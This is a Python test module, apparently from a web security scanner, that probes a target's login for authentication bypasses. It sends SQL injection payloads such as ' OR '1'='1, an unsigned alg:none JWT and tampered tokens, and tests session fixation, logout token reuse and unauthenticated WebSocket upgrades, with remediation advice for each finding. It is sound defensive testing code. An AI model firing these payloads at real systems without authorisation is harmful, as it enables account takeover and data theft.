"""Authentication bypass tests.

Probes authentication mechanisms for common weaknesses: empty
credentials, SQL injection in login fields, token forgery, session
fixation, and post-logout token reuse.
"""

from __future__ import annotations

import logging
import uuid
from typing import List

from tests import BaseTest

logger = logging.getLogger(__name__)

# Basic SQL injection payloads for login fields.
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin'--",
    "' OR 1=1--",
    "' OR ''='",
    "1' OR '1'='1",
    "' UNION SELECT NULL--",
]

# Paths commonly used for authentication.
DEFAULT_LOGIN_PATHS = ["/api/auth/login", "/api/login", "/login", "/api/auth/signin"]
DEFAULT_LOGOUT_PATHS = ["/api/auth/logout", "/api/logout", "/logout", "/api/auth/signout"]


class AuthBypassTest(BaseTest):
    """Test authentication mechanisms for bypass vulnerabilities."""

    def run(self) -> List:
        logger.info("Starting authentication-bypass tests")

        self._test_empty_credentials()
        self._test_sqli_login()
        self._test_token_forgery()
        self._test_session_fixation()
        self._test_logout_invalidation()
        self._test_websocket_auth()

        logger.info(
            "Authentication-bypass tests complete: %d results", len(self.results)
        )
        return self.results

    # ------------------------------------------------------------------
    # Individual test groups
    # ------------------------------------------------------------------

    def _find_login_endpoint(self) -> str:
        """Return the login endpoint from recon or fall back to defaults."""
        recon_login = self.recon.get("login_endpoint")
        if recon_login:
            return recon_login
        # Check recon forms for a login form.
        for form in self.recon.get("forms", []):
            action = form.get("action", "")
            if "login" in action.lower() or "signin" in action.lower():
                return action
        return DEFAULT_LOGIN_PATHS[0]

    def _find_logout_endpoint(self) -> str:
        recon_logout = self.recon.get("logout_endpoint")
        if recon_logout:
            return recon_logout
        return DEFAULT_LOGOUT_PATHS[0]

    # -- Empty credentials --------------------------------------------------

    def _test_empty_credentials(self) -> None:
        test_name = "auth_bypass:empty_credentials"
        login_url = self._find_login_endpoint()
        payloads = [
            {"email": "", "password": ""},
            {"email": "test@test.com", "password": ""},
            {"email": "", "password": "password"},
        ]
        try:
            for payload in payloads:
                resp = self.http.post(login_url, json=payload)
                status = resp.status_code

                if status == 200 and self._looks_like_auth_success(resp):
                    self.add_result(
                        test_name=test_name,
                        status="exploited_verified",
                        severity="critical",
                        description=(
                            f"Login accepted empty/partial credentials: "
                            f"{payload} -> HTTP {status}"
                        ),
                        evidence=f"HTTP {status}, body: {resp.text[:300]}",
                        remediation=(
                            "Require non-empty, valid credentials for login."
                        ),
                    )
                    return  # One confirmed finding is enough.

            self.add_result(
                test_name=test_name,
                status="blocked",
                severity="info",
                description="Empty-credential login attempts were rejected.",
                evidence="All returned non-200 or no auth token.",
                remediation="No action needed.",
            )
        except Exception as exc:
            logger.warning("Error in empty-credentials test: %s", exc)
            self.add_result(
                test_name=test_name,
                status="not_tested",
                severity="info",
                description=f"Could not test empty credentials: {exc}",
                evidence=str(exc),
                remediation="Investigate login endpoint availability.",
            )

    # -- SQL injection in login ---------------------------------------------

    def _test_sqli_login(self) -> None:
        test_name = "auth_bypass:sqli_login"
        login_url = self._find_login_endpoint()
        exploited = False

        try:
            for sqli in SQLI_PAYLOADS:
                for field in ("email", "password"):
                    payload = {
                        "email": sqli if field == "email" else "test@test.com",
                        "password": sqli if field == "password" else "password123",
                    }
                    resp = self.http.post(
                        login_url, json=payload
                    )
                    status = resp.status_code
                    body = resp.text[:500] if hasattr(resp, "text") else ""

                    if status == 200 and self._looks_like_auth_success(resp):
                        self.add_result(
                            test_name=test_name,
                            status="exploited_verified",
                            severity="critical",
                            description=(
                                f"SQL injection in '{field}' field bypassed "
                                f"authentication. Payload: {sqli}"
                            ),
                            evidence=f"HTTP {status}, body: {body[:300]}",
                            remediation=(
                                "Use parameterized queries. Never interpolate "
                                "user input into SQL."
                            ),
                        )
                        exploited = True
                        break

                    # Check for SQL error messages leaked in response.
                    if self._has_sql_error(body):
                        self.add_result(
                            test_name=test_name,
                            status="suspected_unverified",
                            severity="high",
                            description=(
                                f"SQL error message leaked when injecting "
                                f"'{field}'. Payload: {sqli}"
                            ),
                            evidence=f"HTTP {status}, body: {body[:300]}",
                            remediation=(
                                "Suppress SQL error details in responses. Use "
                                "parameterized queries."
                            ),
                        )
                        exploited = True
                        break
                if exploited:
                    break

            if not exploited:
                self.add_result(
                    test_name=test_name,
                    status="blocked",
                    severity="info",
                    description=(
                        "SQL injection payloads in login fields did not bypass auth."
                    ),
                    evidence="No auth token returned for any SQLi payload.",
                    remediation="No action needed.",
                )
        except Exception as exc:
            logger.warning("Error in SQLi login test: %s", exc)
            self.add_result(
                test_name=test_name,
                status="not_tested",
                severity="info",
                description=f"Could not complete SQLi login test: {exc}",
                evidence=str(exc),
                remediation="Investigate.",
            )

    # -- Token forgery ------------------------------------------------------

    def _test_token_forgery(self) -> None:
        test_name = "auth_bypass:token_forgery"
        profile_url = self.recon.get("profile_endpoint", "/api/profile")

        forged_tokens = [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0."
            "eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.",  # alg:none JWT
            "Bearer AAAA.BBBB.CCCC",  # random JWT-shaped string
            str(uuid.uuid4()),  # random UUID
            "admin",  # trivial string
        ]

        # If we have a real token, try modifying it.
        real_token = self.config.get("auth_token", "")
        if real_token and "." in real_token:
            parts = real_token.split(".")
            if len(parts) == 3:
                # Flip a character in the signature.
                modified_sig = parts[2][::-1] if parts[2] else "tampered"
                forged_tokens.append(f"{parts[0]}.{parts[1]}.{modified_sig}")

        try:
            for token in forged_tokens:
                headers = {"Authorization": f"Bearer {token}"}
                resp = self.http.get(
                    profile_url, headers=headers
                )
                status = resp.status_code

                if status == 200 and self._contains_user_data(resp.text):
                    self.add_result(
                        test_name=test_name,
                        status="exploited_verified",
                        severity="critical",
                        description=(
                            f"Forged token accepted by server. Token: "
                            f"{token[:40]}..."
                        ),
                        evidence=f"HTTP {status}, body: {resp.text[:300]}",
                        remediation=(
                            "Validate JWT signature server-side. Reject "
                            "'alg: none' tokens."
                        ),
                    )
                    return

            self.add_result(
                test_name=test_name,
                status="blocked",
                severity="info",
                description="All forged tokens were rejected.",
                evidence="No 200 with user data for any forged token.",
                remediation="No action needed.",
            )
        except Exception as exc:
            logger.warning("Error in token-forgery test: %s", exc)
            self.add_result(
                test_name=test_name,
                status="not_tested",
                severity="info",
                description=f"Could not complete token forgery test: {exc}",
                evidence=str(exc),
                remediation="Investigate.",
            )

    # -- Session fixation ---------------------------------------------------

    def _test_session_fixation(self) -> None:
        test_name = "auth_bypass:session_fixation"
        login_url = self._find_login_endpoint()

        try:
            # Set a known session cookie before login.
            fixed_session = f"fixed-{uuid.uuid4().hex[:16]}"
            cookies = {"session": fixed_session, "sid": fixed_session}

            # Attempt login with pre-set session cookie.
            creds = self._get_test_creds()
            if not creds:
                self.add_result(
                    test_name=test_name,
                    status="not_tested",
                    severity="info",
                    description="No test credentials available for session fixation test.",
                    evidence="No credentials in config.",
                    remediation="Provide test credentials to enable this test.",
                )
                return

            resp = self.http.post(
                login_url,
                json={"email": creds["email"], "password": creds["password"]},
                cookies=cookies,
            )
            status = resp.status_code

            # Check if the server returned the same session id.
            resp_cookies = getattr(resp, "cookies", {})
            resp_session = None
            for name in ("session", "sid", "sessionid", "connect.sid"):
                val = resp_cookies.get(name, "")
                if val:
                    resp_session = val
                    break

            if resp_session and resp_session == fixed_session:
                self.add_result(
                    test_name=test_name,
                    status="exploited_verified",
                    severity="high",
                    description=(
                        "Session fixation: server kept the pre-set session "
                        "cookie after login."
                    ),
                    evidence=(
                        f"Pre-set session={fixed_session}, "
                        f"post-login session={resp_session}"
                    ),
                    remediation=(
                        "Regenerate the session identifier after successful "
                        "authentication."
                    ),
                )
            else:
                self.add_result(
                    test_name=test_name,
                    status="blocked",
                    severity="info",
                    description="Session ID was regenerated after login.",
                    evidence=f"HTTP {status}, new session issued.",
                    remediation="No action needed.",
                )
        except Exception as exc:
            logger.warning("Error in session-fixation test: %s", exc)
            self.add_result(
                test_name=test_name,
                status="not_tested",
                severity="info",
                description=f"Could not test session fixation: {exc}",
                evidence=str(exc),
                remediation="Investigate.",
            )

    # -- Logout invalidation ------------------------------------------------

    def _test_logout_invalidation(self) -> None:
        test_name = "auth_bypass:logout_invalidation"
        token = self.config.get("auth_token", "")
        if not token:
            self.add_result(
                test_name=test_name,
                status="not_tested",
                severity="info",
                description="No auth token available to test logout invalidation.",
                evidence="No token in config.",
                remediation="Provide an auth token to enable this test.",
            )
            return

        logout_url = self._find_logout_endpoint()
        profile_url = self.recon.get("profile_endpoint", "/api/profile")

        try:
            # Step 1: verify token works.
            pre_resp = self.http.get(profile_url)
            if pre_resp.status_code != 200:
                self.add_result(
                    test_name=test_name,
                    status="not_tested",
                    severity="info",
                    description=(
                        "Token did not work before logout; cannot test invalidation."
                    ),
                    evidence=f"Pre-logout profile: HTTP {pre_resp.status_code}",
                    remediation="Provide a valid auth token.",
                )
                return

            # Step 2: log out.
            self.http.post(logout_url)

            # Step 3: try using the same token again.
            headers = {"Authorization": f"Bearer {token}"}
            post_resp = self.http.get(
                profile_url, headers=headers
            )

            if post_resp.status_code == 200 and self._contains_user_data(
                post_resp.text
            ):
                self.add_result(
                    test_name=test_name,
                    status="exploited_verified",
                    severity="high",
                    description=(
                        "Token still valid after logout. Session not invalidated."
                    ),
                    evidence=(
                        f"Post-logout profile request: HTTP "
                        f"{post_resp.status_code}"
                    ),
                    remediation=(
                        "Invalidate tokens server-side on logout (blocklist "
                        "or short-lived tokens with refresh rotation)."
                    ),
                )
            else:
                self.add_result(
                    test_name=test_name,
                    status="blocked",
                    severity="info",
                    description="Token was correctly invalidated after logout.",
                    evidence=f"Post-logout: HTTP {post_resp.status_code}",
                    remediation="No action needed.",
                )
        except Exception as exc:
            logger.warning("Error in logout-invalidation test: %s", exc)
            self.add_result(
                test_name=test_name,
                status="not_tested",
                severity="info",
                description=f"Could not test logout invalidation: {exc}",
                evidence=str(exc),
                remediation="Investigate.",
            )

    # -- WebSocket auth -----------------------------------------------------

    def _test_websocket_auth(self) -> None:
        test_name = "auth_bypass:websocket_auth"
        ws_endpoints = self.recon.get("websocket_endpoints", [])
        if not ws_endpoints:
            self.add_result(
                test_name=test_name,
                status="not_tested",
                severity="info",
                description="No WebSocket endpoints found during recon.",
                evidence="recon_data['websocket_endpoints'] is empty.",
                remediation="Manually verify if WebSocket endpoints exist.",
            )
            return

        try:
            for ws_url in ws_endpoints:
                url = ws_url if isinstance(ws_url, str) else ws_url.get("url", "")
                if not url:
                    continue

                # Try connecting without auth (use HTTP upgrade probe).
                resp = self.http.get(
                    url,
                    headers={
                        "Upgrade": "websocket",
                        "Connection": "Upgrade",
                        "Sec-WebSocket-Version": "13",
                        "Sec-WebSocket-Key": "dGVzdA==",
                    },
                )
                status = resp.status_code

                if status == 101:
                    self.add_result(
                        test_name=test_name,
                        status="exploited_verified",
                        severity="high",
                        description=(
                            f"WebSocket {url} accepted connection without auth."
                        ),
                        evidence=f"HTTP {status} Switching Protocols",
                        remediation=(
                            "Require authentication for WebSocket upgrade."
                        ),
                    )
                elif status in (401, 403):
                    self.add_result(
                        test_name=test_name,
                        status="blocked",
                        severity="info",
                        description=(
                            f"WebSocket {url} correctly requires authentication."
                        ),
                        evidence=f"HTTP {status}",
                        remediation="No action needed.",
                    )
                else:
                    self.add_result(
                        test_name=test_name,
                        status="suspected_unverified",
                        severity="medium",
                        description=(
                            f"WebSocket {url} returned unexpected status {status} "
                            f"without auth."
                        ),
                        evidence=f"HTTP {status}",
                        remediation="Manually verify WebSocket auth behavior.",
                    )
        except Exception as exc:
            logger.warning("Error in WebSocket auth test: %s", exc)
            self.add_result(
                test_name=test_name,
                status="not_tested",
                severity="info",
                description=f"Could not test WebSocket auth: {exc}",
                evidence=str(exc),
                remediation="Investigate.",
            )

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _get_test_creds(self) -> dict | None:
        """Return first available test credentials, or None."""
        accounts = self.config.get("accounts", {})
        for _name, acct in accounts.items():
            email = acct.get("email") or getattr(acct, "email", "")
            password = acct.get("password") or getattr(acct, "password", "")
            if email and password:
                return {"email": email, "password": password}
        return None

    @staticmethod
    def _looks_like_auth_success(resp) -> bool:
        """Heuristic: does the response look like a successful login?"""
        body = resp.text[:1000] if hasattr(resp, "text") else ""
        lower = body.lower()
        return any(
            tok in lower
            for tok in ['"token"', '"access_token"', '"jwt"', '"session"', '"auth"']
        )

    @staticmethod
    def _has_sql_error(body: str) -> bool:
        """Check if the body contains common SQL error indicators."""
        indicators = [
            "sql syntax",
            "mysql",
            "postgresql",
            "sqlite",
            "syntax error",
            "unclosed quotation",
            "unterminated string",
            "pg_query",
            "ORA-",
            "Microsoft SQL",
        ]
        lower = body.lower()
        return any(ind.lower() in lower for ind in indicators)

    @staticmethod
    def _contains_user_data(body: str) -> bool:
        indicators = [
            '"email"', '"phone"', '"user_id"', '"userId"',
            '"username"', '"name"', '"profile"',
        ]
        lower = body.lower()
        return any(ind.lower() in lower for ind in indicators)
